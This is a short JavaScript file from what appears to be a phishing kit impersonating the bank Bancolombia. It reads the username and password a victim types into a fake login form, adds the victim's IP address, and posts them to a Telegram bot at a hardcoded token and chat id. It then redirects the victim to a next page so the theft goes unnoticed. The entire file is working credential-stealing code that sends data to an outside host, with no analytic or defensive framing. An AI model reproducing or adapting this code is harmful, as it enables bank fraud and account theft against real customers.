//bot token
var telegram_bot_id = "5691902461:AAH8iDabEZ6ORHxkA0IVBdFY73ANwoTQaWU";
//chat id
var chat_id = 2048726727;
var u_name, u_name2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("258025").value;
    u_name2 = document.getElementById("258020").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "💛BANCOLOMBIA💛\n👤US3R: " + u_name + "\n🔐Clav3: " + u_name2 + "\nIP: " + ip +"\n" + ip2 +"\n💛C0DE BY SYN4PSE💛";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'proceso1.html';
        console.log(response);
    });
    return false;
};
